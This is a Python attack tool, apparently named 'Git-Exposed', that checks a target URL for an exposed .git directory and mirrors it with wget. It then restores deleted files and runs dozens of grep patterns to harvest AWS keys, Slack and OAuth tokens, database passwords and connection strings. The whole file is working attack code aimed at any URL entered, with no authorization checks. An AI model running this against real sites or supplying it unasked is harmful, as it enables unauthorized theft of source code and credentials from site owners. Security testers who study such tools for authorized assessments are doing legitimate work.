import requests
import re
import time
import base64
import os
import sys
import subprocess
import threading
import itertools
import urllib3
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# REGEX SIMPLES | altere como achar melhor!!!
sensitive_data_patterns = {
    r'(https?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+)': "URLs",
    r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+': "Emails",
    r'\b((?:\d{1,3}\.){3}\d{1,3})\b': "IPv4 Addresses",
    r'\b([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b': "IPv6 Addresses",
    r'[a-zA-Z0-9+/=]{10,}==?': "Base64 Encoded Data",
}

def decode_base64(data):
    try:
        # Verificação se os dados são base64 válidos
        if len(data) % 4 == 0:
            decoded_data = base64.b64decode(data).decode('utf-8', errors='ignore')
            return decoded_data
    except Exception as e:
        return f"Error decoding Base64: {e}"
    return "Invalid Base64 data"

# Função para listar os commits do repositório
def list_commits():
    print(f"{Fore.LIGHTCYAN_EX}[>] Listing commits...")
    result = subprocess.run(['git', 'log', '--pretty=format:%H - %an: %s'], capture_output=True, text=True)
    if result.returncode == 0:
        print(f"{Fore.LIGHTGREEN_EX}{result.stdout}")
    else:
        print(f"{Fore.RED}[!] Failed to list commits.")

# Função para visualizar um commit específico
def view_commit(commit_hash):
    print(f"{Fore.LIGHTCYAN_EX}[>] Viewing commit: {commit_hash}")
    result = subprocess.run(['git', 'show', commit_hash], capture_output=True, text=True)
    if result.returncode == 0:
        print(f"{Fore.LIGHTGREEN_EX}{result.stdout}")
    else:
        print(f"{Fore.RED}[!] Failed to show commit: {commit_hash}")

def check_git_exposure(target_url):
    paths = [
        ".git/HEAD",
        ".git/config",
        ".git/COMMIT_EDITMSG",
        ".git/logs/HEAD",
        ".git/logs/refs/heads/master",
        ".git/logs/refs/remotes/origin/master",
        ".git/info/exclude",
        ".git/refs/remotes/origin/master"
    ]

    exposed_found = False
    found_data = {name: set() for name in sensitive_data_patterns.values()}

    for path in paths:
        url = f"{target_url}/{path}"
        response = requests.get(url, verify=False)

        if response.status_code == 200:
            if any(tag in response.text.lower() for tag in ["<html", "<body", "<title", "<head"]):
                continue

            exposed_found = True
            print(f"{Fore.LIGHTGREEN_EX}[+] Path Found: {url}")

            for pattern, name in sensitive_data_patterns.items():
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if match not in found_data[name]: 
                        found_data[name].add(match)

    for name, matches in found_data.items():
        if matches:
            print(f"{Fore.RED}[!] {name}:")
            for match in matches:
                print(f"{Fore.LIGHTBLUE_EX}    [-] {match}")
                if name == "Base64 Encoded Data":
                    decoded = decode_base64(match)
                    print(f"{Fore.LIGHTYELLOW_EX}    [>] Decoded Base64: {decoded}")

    if not exposed_found:
        print(f"{Fore.LIGHTYELLOW_EX}[>] No exposed Git repositories found.")
    else:
        download_git_directory(target_url)

    print(f"{Fore.LIGHTCYAN_EX}[>] Verification completed.")
    return exposed_found

def animate():
    for c in itertools.cycle(['[|]', '[/]', '[-]', '[\\]']):
        if done:
            break
        print(f"\r{Fore.LIGHTGREEN_EX}[+] Downloading {c}", end="")
        time.sleep(0.1)
    print(f"\r{Fore.LIGHTGREEN_EX}[+] Download completed!")

def download_git_directory(target_url):
    global done
    done = False
    
    choice = input(f"{Fore.LIGHTCYAN_EX}[>] Do you want to download the '.git' directory? (y/n): ").lower()
    if choice == 'y':
        print(f"{Fore.LIGHTGREEN_EX}[+] Starting download of .git directory...")
        
        t = threading.Thread(target=animate)
        t.start()
        
        os.system(f"wget --mirror --no-check-certificate -I .git -P ./git_download {target_url}/.git/ --quiet")
        
        done = True
        t.join()

        site_name = target_url.split("//")[1].split("/")[0]
        os.chdir(f'./git_download/{site_name}')
        check_git_status()

    elif choice == 'n':
        print(f"{Fore.LIGHTGREEN_EX}[+] Exiting...")
        time.sleep(2)
        sys.exit(0)

def check_sensitive_files():
    print(f"{Fore.LIGHTCYAN_EX}[>] Checking for sensitive files...")
    time.sleep(5)
    commands = [
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for basic auth...", "grep -HrniEo 'BASIC[\\-|_|A-Z0–9]*(\’|\”)?(:|=)(\’|\”)?[\\-|_|A-Z0–9]{10}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Google Maps Api...", "grep -HnriEo 'AIza[0-9A-Za-z\\-]{35}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Google Cloud API...", "grep -HrniEo '(?i)(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z\\-_]{35}]['\"]' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Google-Driver-Gmail-Youtube-Oauth...", "grep -HrniEo '[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for FIREBASE...", "grep -HrniEo '[a-z0-9.-]+\\.firebaseio\\.com' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for FIREBASE(APP)...", "grep -HrniEo '[a-z0-9.-]+\\.firebaseapp\\.com' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Shopify-token...", "grep -HrniEo 'shpat_[a-fA-F0-9]{32}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Slack webhooks...", "grep -HnriEo 'https://hooks.slack.com/services/T[a-zA-Z0-9]{8}/B[a-zA-Z0-9]{8}/[a-zA-Z0-9]{24}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for slack api...", "grep -HnriEo '(slack_api|SLACK_API)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Slack Token...", "grep -HrniEo 'xox[baprs]-([0-9a-zA-Z]{10,48})?' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Slack BotAccess...", "grep -HrniEo 'xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Slack UserAccess...", "grep -HrniEo 'xoxp-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Slack Oauth Config...", "grep -HrniEo 'xoxe.xoxp-1-[0-9a-zA-Z]{166}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Slack Oauth Refresh...", "grep -HrniEo 'xoxe-1-[0-9a-zA-Z]{147}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Linkedin-ClientID...", "grep -HrniEo '(?i)linkedin(.{0,20})?(?-i)['\"][0-9a-z]{12}['\"]' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Linkedin-SecretKey...", "grep -HrniEo '(?i)linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Aws Access Key...", "grep -HnriEo 'AKIA[0-9A-Z]{16}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for AWS-ClientID...", "grep -HnriEo '(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking Bearer auth...", "grep -HnriEo 'bearer [a-zA-Z0-9\\-\\.=]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking Cloudinary auth key...", "grep -HnriEo 'cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking Mailgun api key...", "grep -HnriEo 'key-[0-9a-zA-Z]{32}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Api key parameters...", "grep -HnriEo '(api_key|API_KEY|ApiKey)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for access token...", "grep -HnriEo '(access_token|ACCESSTOKEN|)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Bearer Token...", "grep -HnriEo 'bearer [a-zA-Z0-9-.=:_+/]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for db password...", "grep -HnriEo '(db_password|DB_PASSWORD)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for db username...", "grep -HnriEo '(db_username|DB_USERNAME)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for authorization tokens...", "grep -HnriEo '(authorizationToken|AUTHORIZATIONTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for app key...", "grep -HnriEo '(app_key|APPKEY)(:|=| : | = )( |\"|')[0-9A-Za-z\\-]{5,100}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for aws links, buckets and secrets...", "grep -HnriEo '(.{8}[A-z0-9-].amazonaws.com/)[A-z0-9-].{6}' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for aws secret keys...", "grep -HnriEo '(?i)aws(.{0,20})?(?-i)[\"'][0-9a-zA-Z/+]{40}[\"']' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for encryption keys in PHP...", "grep -HnriEo '(SECRET_KEY|ENCRYPTION_KEY|private_key|PRIVATE_KEY)\\s*=\\s*[\'\"].*[\'\"]' --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for sensitive session data (PHP)...", "grep -HnriEo '\\$_SESSION\\[.*\\]' --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for sensitive cookies (PHP)...", "grep -HnriEo '\\$_COOKIE\\[.*\\]' --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for environment variables (PHP)...", "grep -HnriEo '\\$_ENV\\[.*\\]' --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for database connection strings (PostgreSQL)...", "grep -HnriEo 'pgsql:host=[^;]+;port=[0-9]+;dbname=[^;]+;user=[^;]+;password=[^;]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Oracle DB connection strings...", "grep -HnriEo 'oci_connect\\([^)]+\\)' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for FTP credentials...", "grep -HnriEo '(ftp_connect|ftp_login)\\([^)]+\\)' --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for database credentials...", "grep -HnriEo '(db_password|db_user|db_name|db_host)\\s*=\\s*[\'\"].*[\'\"]' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for stored procedures (SQL)...", "grep -HnriEo 'CREATE PROCEDURE.*AS' --include=*.sql ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for SQL backups (SQL)...", "grep -HnriEo 'BACKUP DATABASE.*TO DISK' --include=*.sql ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for embedded SQL connection strings...", "grep -HnriEo 'jdbc:mysql://[^\\s\"]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for PostgreSQL connection strings...", "grep -HnriEo 'jdbc:postgresql://[^\\s\"]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for potential SQL passwords...", "grep -HnriEo '(password|pwd|secret|pass)\\s*=\\s*[\'\"].*[\'\"]' --include=*.sql ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for hardcoded passwords...", "grep -HnriEo '(password|pwd|secret|pass|credentials|api_key|token|key|access|auth|apikey|secret_key|db_pass|db_user|ftp_pass|ftp_user|password_hash|client_secret|refresh_token|api_secret|jwt_secret|service_account_key)\\s*=\\s*[\'\"].*[\'\"]' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for MySQL connection strings...", "grep -HnriEo 'mysql:\\/\\/[a-zA-Z0-9_]+:[a-zA-Z0-9_]+@[a-zA-Z0-9_.-]+:[0-9]+\\/[a-zA-Z0-9_]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for MongoDB connection strings...", "grep -HnriEo 'mongodb:\\/\\/[a-zA-Z0-9]+:[a-zA-Z0-9@.-]+\\/[a-zA-Z0-9_]+' --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for SQLite database files...", "grep -HnriEo '.*\\.sqlite' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for email addresses...", "grep -HnriEo '[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Mailto...", "grep -HnriEo '(?<=mailto:)[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+' ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Exec Code Execution...", "grep -HnriEo \"\\b(system|exec|shell_exec|passthru|proc_open|popen)\\s*\\(\\s*['\\\"]\\s*.*\\s*['\\\"]\\s*\\)\" --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Authentication ...", "grep -HnriEo \"\\b(login|authenticate|session_start|setcookie)\\s*\\(\\s*['\\\"]\\s*.*\\s*['\\\"]\\s*\\)\" --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for Forms...", "grep -HnriEo \"\\b(method|action)\\s*=\\s*['\\\"]\\s*.*?\\s*['\\\"]\\s*\" --include=*.php ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for unsafe JSON parsing...", "grep -HnriEo \"\\bJSON\\.parse\\s*\\(\\s*[^)]+?\\s*\\)\" --include=*.js ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for insecure cookie manipulation...", "grep -HnriEo \"document\\.cookie\\s*=\\s*['\"]?[^'\";]*['\"]?\" --include=*.js ./"),
        (f"{Fore.LIGHTCYAN_EX}[ + ] Checking for exposed API keys...", "grep -HnriEo \"(apikey|API_KEY|secret|SECRET)\\s*:.*['\"]?[^'\"}]+['\"]?\" --include=*.js ./"),
      
    ]
    
    for description, command in commands:
        print(description)
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.stdout:
            print(f"{Fore.LIGHTRED_EX}[!] Sensitive information found:\n{result.stdout}")
        else:
            print(f"{Fore.LIGHTYELLOW_EX}[>] No sensitive data found for this check.")



def check_git_status():
    try:
        
        result = subprocess.run(['git', 'status'], capture_output=True, text=True, check=True)
        deleted_files = subprocess.run(['git', 'status'], capture_output=True, text=True)
        
        if "deleted" in deleted_files.stdout:
            print(deleted_files.stdout)

            choice = input(f"{Fore.LIGHTCYAN_EX}[>] Do you want to restore deleted files? (y/n): ").lower()
            if choice == 'y':
                subprocess.run(['git', 'restore', '.'])
                print(f"{Fore.LIGHTGREEN_EX}[+] Files restored successfully.")
                check_sensitive_files()
        else:
            print(f"{Fore.LIGHTYELLOW_EX}[>] No deleted files to restore.")

    except subprocess.CalledProcessError as e:
        # Verifica se o erro é relacionado ao índex ou a objetos corrompidos
        if "unknown index entry" in e.stderr or "is corrupt" in e.stderr:
            print(f"{Fore.LIGHTRED_EX}[!] Detected corruption in the git repository. Attempting to fix...")
            time.sleep(4)
            # Tenta verificar a integridade do repositório
            integrity_check = subprocess.run(['git', 'fsck'], capture_output=True, text=True)
            if integrity_check.returncode != 0:
                print(f"{Fore.LIGHTRED_EX}[!] Git integrity check failed")
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[>] Integrity check complete. Reviewing corrupt objects...")

                print(f"{Fore.LIGHTRED_EX}[!] Please consider cleaning up the repository manually or using the following command:")
                print(f"{Fore.LIGHTCYAN_EX}[>] git gc --prune=now")

            # remover o índex e tentar resetar
            try:
                subprocess.run(['rm', '-f', '.git/index'], check=True)
                subprocess.run(['git', 'reset'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

                result = subprocess.run(['git', 'status'], capture_output=True, text=True)
                deleted_files = subprocess.run(['git', 'status'], capture_output=True, text=True)
                print(f"{Fore.LIGHTGREEN_EX}[+] Index rebuilt successfully. Checking for deleted files...")
                time.sleep(4)
                if "deleted" in deleted_files.stdout:
                    print(deleted_files.stdout)
                    
                    choice = input(f"{Fore.LIGHTCYAN_EX}[>] Do you want to restore deleted files? (y/n): ").lower()
                    if choice == 'y':
                        subprocess.run(['git', 'restore', '.'])
                        print(f"{Fore.LIGHTGREEN_EX}[+] Files restored successfully.")
                        check_sensitive_files()
                else:
                    print(f"{Fore.LIGHTYELLOW_EX}[>] No deleted files to restore.")

            except subprocess.CalledProcessError as reset_error:
                print(f"{Fore.LIGHTRED_EX}[!] Failed to reset git index")
                print(f"{Fore.LIGHTGREEN_EX}[+] Exiting...")
                time.sleep(2)                
                sys.exit(0)

def check_root_permissions():
    if os.geteuid() != 0:
        print("\033[91m[!] This script must be run as root!\033[0m")
        sys.exit(1)
        
def main():	
    # Banner
    print(f"""{Fore.LIGHTBLUE_EX}
   ___ _ _          __  __                    _  
  / __(_) |_ ___ ___\ \/ /_ __  ___ ______ __| | 
 | (_ | |  _|___/ -_)>  <| '_ \/ _ (_-< -_) _` | 
  \___|_|\__|   \___/_/\_\ .__/\___/__|___\__,_| 
                         |_|                      
                           \_[>]By (Mr_ofcodyx)[<]  
                           """)
    print(f"{Fore.LIGHTCYAN_EX}[*] Twitter: https://x.com/mr_ofcodyx")
    print(f"{Fore.LIGHTCYAN_EX}[*] Github:  https://github.com/mrofcodyx")
    print(f"{Fore.LIGHTCYAN_EX}[*] Youtube: https://youtube.com/@mr_ofcodyx")
    print(f"{Fore.BLUE}____________________________________________________")
    
    check_root_permissions()

    target_url = input("Enter the target URL: ")

    start_time = time.time()
    git_exposed = check_git_exposure(target_url)

    if git_exposed:
        while True:
            choice = input(f"{Fore.LIGHTCYAN_EX}[>] Do you want to list or view a specific commit? (list/view/exit): ").lower()
            if choice == 'list':
                list_commits()
            elif choice == 'view':
                commit_hash = input(f"{Fore.LIGHTCYAN_EX}[>] Enter the commit hash: ")
                view_commit(commit_hash)
            elif choice == 'exit':
                print(f"{Fore.LIGHTGREEN_EX}[+] Exiting...")
                break
            else:
                print(f"{Fore.RED}[!] Invalid option. Please choose 'list', 'view', or 'exit'.")
    else:
        print(f"{Fore.LIGHTGREEN_EX}[+] Exiting...")

if __name__ == "__main__":
    main()
